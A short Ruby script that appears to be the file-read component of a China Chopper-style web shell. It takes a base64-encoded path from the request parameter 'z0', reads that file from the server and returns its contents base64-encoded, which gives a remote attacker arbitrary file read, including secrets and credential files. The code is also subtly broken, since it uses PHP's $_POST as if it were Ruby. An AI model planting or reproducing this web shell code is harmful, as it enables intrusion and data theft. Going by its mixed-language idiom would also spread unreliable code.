require 'base64'

def main
  sz_file_path = Base64.decode64($_POST['z0'].to_s)

  begin
    ab_image_data = File.binread(sz_file_path)
    print Base64.strict_encode64(ab_image_data)
  rescue => e
    print 'ERROR://Unable to open file.'
  end
end

main